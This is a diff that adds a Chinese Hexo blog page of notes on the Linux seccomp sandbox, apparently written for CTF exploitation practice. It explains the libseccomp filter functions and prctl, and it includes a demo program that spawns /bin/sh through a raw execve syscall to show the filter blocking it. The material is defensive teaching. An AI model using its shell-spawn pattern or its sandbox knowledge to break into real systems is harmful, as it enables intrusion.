@@ -1,0 +1,632 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Yogdzewa">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="最近的题目，其实都偏向高版本 glibc 的应用和 都开启了 seccomp保护机制。刚开始学习这个机制，先补充一点基础知识，然后再补充相应题目（可能得要一段时间才能来填坑了，欠了太多的题目了）。 Seccomp基础知识seccomp 是一种内核中的安全机制，未使用seccomp时，程序可以使用使用的 syscall，这是不安全的，因为 我们常见的 getshell 方式都是通过程序中一些 不安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Yogdzewa">
+<meta property="og:url" content="https://yogdzewa.github.io/2022-10/Now-seccomp/index.html">
+<meta property="og:site_name" content="Yogdzewa">
+<meta property="og:description" content="最近的题目，其实都偏向高版本 glibc 的应用和 都开启了 seccomp保护机制。刚开始学习这个机制，先补充一点基础知识，然后再补充相应题目（可能得要一段时间才能来填坑了，欠了太多的题目了）。 Seccomp基础知识seccomp 是一种内核中的安全机制，未使用seccomp时，程序可以使用使用的 syscall，这是不安全的，因为 我们常见的 getshell 方式都是通过程序中一些 不安全">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927152057796.png">
+<meta property="og:image" content="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927152419901.png">
+<meta property="og:image" content="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927162846297.png">
+<meta property="og:image" content="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927192512069.png">
+<meta property="og:image" content="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927203558191.png">
+<meta property="og:image" content="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927203926028.png">
+<meta property="og:image" content="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927204135309.png">
+<meta property="article:published_time" content="2022-10-19T01:57:53.807Z">
+<meta property="article:modified_time" content="2022-10-19T02:05:11.003Z">
+<meta property="article:author" content="Yogdzewa">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927152057796.png">
+  
+  
+  <title>Yogdzewa</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/obsidian.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"yogdzewa.github.io","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>(￣.￣)</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/image/edit2.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-10-19 09:57" pubdate>
+        2022年10月19日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      19k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      242 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+              <p class="note note-info">
+                
+                  不可视境界线最后变动于：2022年10月19日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>最近的题目，其实都偏向高版本 glibc 的应用和 都开启了 seccomp保护机制。刚开始学习这个机制，先补充一点基础知识，然后再补充相应题目（可能得要一段时间才能来填坑了，欠了太多的题目了）。</p>
+<h2 id="Seccomp基础知识"><a href="#Seccomp基础知识" class="headerlink" title="Seccomp基础知识"></a>Seccomp基础知识</h2><p>seccomp 是一种内核中的安全机制，未使用seccomp时，程序可以使用使用的 syscall，这是不安全的，因为 我们常见的 getshell 方式都是通过程序中一些 不安全的 函数中的 sysycall 来导致的，比如劫持 execve。但是通过seccomp，可以在程序中禁用掉某些 syscall，这样就算劫持了程序流也只能调用部分 syscall了。</p>
+<h3 id="编程使用seccomp"><a href="#编程使用seccomp" class="headerlink" title="编程使用seccomp"></a>编程使用seccomp</h3><p>调用seccomp 的程序是能够直接运行，但是在自己编写调用 seccomp 程序的代码时，需要我们先安装相应的 头文件：</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> apt install libseccomp-dev libseccomp<span class="hljs-number">2</span> seccomp<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927152057796.png" srcset="/img/loading.gif" lazyload alt="image-20200927152057796"></p>
+<p>在如下测试程序中：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//gcc -g simple_syscall_seccomp.c -o simple_syscall_seccomp -lseccomp</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/seccomp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>	scmp_filter_ctx ctx;<br>	ctx = seccomp_init(SCMP_ACT_ALLOW);<br>	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="hljs-number">0</span>);<br>	seccomp_load(ctx);<br><br>	<span class="hljs-keyword">char</span> * filename = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>	<span class="hljs-keyword">char</span> * argv[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>	<span class="hljs-keyword">char</span> * envp[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br>	write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;i will give you a shell\n&quot;</span>,<span class="hljs-number">24</span>);<br>	syscall(<span class="hljs-number">59</span>,filename,argv,envp);<span class="hljs-comment">//execve</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>运行结果如下所示，执行 execve 时程序报错退出。原因就是 seccomp 阻止了程序通过 execve来执行 syscall。</p>
+<p><img src="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200927152419901.png" srcset="/img/loading.gif" lazyload alt="image-20200927152419901"></p>
+<p>解释一下上述代码：</p>
+<p><code>ctx</code> 是 <code>Filter context/handle</code> ，其中 <code>typedef void *scmp_filter_ctx</code>；</p>
+<p><code>seccomp_init</code> 是初始化的过滤状态，这里用的是 <code>SCMP_ACT_ALLOW</code> ，表示默认允许所有的 syscall，如果初始化状态为 <code>SCMP_ACT_KILL</code> 则表示不允许所有的 syscall。</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * seccomp actions</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Kill the process</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_KILL		0x00000000U</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Throw a SIGSYS signal</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_TRAP		0x00030000U</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Return the specified error code</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_ERRNO(x)	(0x00050000U | ((x) &amp; 0x0000ffffU))</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Notify a tracing process with the specified value</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_TRACE(x)	(0x7ff00000U | ((x) &amp; 0x0000ffffU))</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Allow the syscall to be executed after the action has been logged</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_LOG		0x7ffc0000U</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Allow the syscall to be executed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_ALLOW		0x7fff0000U</span><br></code></pre></div></td></tr></table></figure>
+
+<p><code>seccomp_rule_add</code> 是添加一条规则，函数原型如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Add a new rule to the filter</span><br><span class="hljs-comment"> * @param ctx the filter context</span><br><span class="hljs-comment"> * @param action the filter action</span><br><span class="hljs-comment"> * @param syscall the syscall number</span><br><span class="hljs-comment"> * @param arg_cnt the number of argument filters in the argument filter chain</span><br><span class="hljs-comment"> * @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended)</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function adds a series of new argument/value checks to the seccomp</span><br><span class="hljs-comment"> * filter for the given syscall; multiple argument/value checks can be</span><br><span class="hljs-comment"> * specified and they will be chained together (AND&#x27;d together) in the filter.</span><br><span class="hljs-comment"> * If the specified rule needs to be adjusted due to architecture specifics it</span><br><span class="hljs-comment"> * will be adjusted without notification.  Returns zero on success, negative</span><br><span class="hljs-comment"> * values on failure.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">seccomp_rule_add</span><span class="hljs-params">(scmp_filter_ctx ctx,</span></span><br><span class="hljs-params"><span class="hljs-function">		     <span class="hljs-keyword">uint32_t</span> action, <span class="hljs-keyword">int</span> syscall, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> arg_cnt, ...)</span></span>;<br></code></pre></div></td></tr></table></figure>
+
+<p><code>seccomp_load</code> 是应用过滤，如果不调用 <code>seccomp_load</code> 则上面的所有的过滤都不会生效。</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Loads the filter into the kernel</span><br><span class="hljs-comment"> * @param ctx the filter context</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function loads the given seccomp filter context into the kernel.  If</span><br><span class="hljs-comment"> * the filter was loaded correctly, the kernel will be enforcing the filter</span><br><span class="hljs-comment"> * when this function returns.  Returns zero on success, negative values on</span><br><span class="hljs-comment"> * error.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">seccomp_load</span><span class="hljs-params">(<span class="hljs-keyword">const</span> scmp_filter_ctx ctx)</span></span>;<br></code></pre></div></td></tr></table></figure>
+
+<p>上面代码中 <code>seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);</code> arg_cnt=0，是表示不管 execve 的参数是什么，都会直接限制 execve 执行 syscall。</p>
+<p>如果 <code>arg_cnt</code> 不为0，那 <code>arg_cnt</code> 表示后面限制的参数的个数，也就是只有调用 execve，且参数满足要求时，才会拦截 syscall。</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for use in declaring rules</span><br><span class="hljs-comment"> * @param arg the argument number, starting at 0</span><br><span class="hljs-comment"> * @param op the comparison operator, e.g. SCMP_CMP_*</span><br><span class="hljs-comment"> * @param datum_a dependent on comparison</span><br><span class="hljs-comment"> * @param datum_b dependent on comparison, optional</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_CMP(...)		((struct scmp_arg_cmp)&#123;__VA_ARGS__&#125;)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A0(...)		SCMP_CMP(0, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A1(...)		SCMP_CMP(1, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A2(...)		SCMP_CMP(2, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A3(...)		SCMP_CMP(3, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A4(...)		SCMP_CMP(4, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 5</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A5(...)		SCMP_CMP(5, __VA_ARGS__)</span><br><br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Comparison operators</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">scmp_compare</span> &#123;</span><br>	_SCMP_CMP_MIN = <span class="hljs-number">0</span>,<br>	SCMP_CMP_NE = <span class="hljs-number">1</span>,		<span class="hljs-comment">/**&lt; not equal */</span><br>	SCMP_CMP_LT = <span class="hljs-number">2</span>,		<span class="hljs-comment">/**&lt; less than */</span><br>	SCMP_CMP_LE = <span class="hljs-number">3</span>,		<span class="hljs-comment">/**&lt; less than or equal */</span><br>	SCMP_CMP_EQ = <span class="hljs-number">4</span>,		<span class="hljs-comment">/**&lt; equal */</span><br>	SCMP_CMP_GE = <span class="hljs-number">5</span>,		<span class="hljs-comment">/**&lt; greater than or equal */</span><br>	SCMP_CMP_GT = <span class="hljs-number">6</span>,		<span class="hljs-comment">/**&lt; greater than */</span><br>	SCMP_CMP_MASKED_EQ = <span class="hljs-number">7</span>,		<span class="hljs-comment">/**&lt; masked equality */</span><br>	_SCMP_CMP_MAX,<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Argument datum</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> <span class="hljs-keyword">scmp_datum_t</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Argument / Value comparison definition</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scmp_arg_cmp</span> &#123;</span><br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> arg;	<span class="hljs-comment">/**&lt; argument number, starting at 0 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">scmp_compare</span> <span class="hljs-title">op</span>;</span>	<span class="hljs-comment">/**&lt; the comparison op, e.g. SCMP_CMP_* */</span><br>	<span class="hljs-keyword">scmp_datum_t</span> datum_a;<br>	<span class="hljs-keyword">scmp_datum_t</span> datum_b;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
+
+<p>举例，拦截 write 函数 参数大于 0x10 时的系统调用</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/seccomp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>	scmp_filter_ctx ctx;<br>	ctx = seccomp_init(SCMP_ACT_ALLOW);<br>	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write),<span class="hljs-number">1</span>,SCMP_A2(SCMP_CMP_GT,<span class="hljs-number">0x10</span>));<span class="hljs-comment">//第2(从0)个参数大于0x10</span><br>	seccomp_load(ctx);<br>	write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;i will give you a shell\n&quot;</span>,<span class="hljs-number">24</span>);<span class="hljs-comment">//会拦截</span><br>	write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;1234567812345678&quot;</span>,<span class="hljs-number">0x10</span>);<span class="hljs-comment">//不被拦截</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="Prtctl简介"><a href="#Prtctl简介" class="headerlink" title="Prtctl简介"></a>Prtctl简介</h3><p>除了 seccomp，还有一个叫 <code>prctl</code> 的函数 也能做到类似的效果，函数原型如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">prctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> option, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg2, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg3,</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg4, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg5)</span></span>;<br></code></pre></div></td></tr></table></figure>
+
+<p>早期 seccomp 是使用 prctl 系统调用实现的，后来封装成了一个 libcseccomp 库，该函数时进行进程控制的，这里也有 seccomp 的功能。</p>
+<p>首先，使用 Prctl 需要有 <code>CAP_SYS_ADMIN</code>权能，否则就要设置 <code>PR_SET_NO_NEW_PRIVS</code> 位，若不这样做 非 root 用户使用该程序时 <code>seccomp</code>保护将会失效，设置了 <code>PR_SET_NO_NEW_PRIVS</code> 位后能保证 <code>seccomp</code> 对所有用户都能起作用，并且会使子进程即 execve 后的进程依然失控，意思就是 即使执行了 <code>execve</code> 这个系统调用替换了整个 binary 权限不会变化，设置后也不能再更改。</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);     <span class="hljs-comment">//设为1</span><br></code></pre></div></td></tr></table></figure>
+
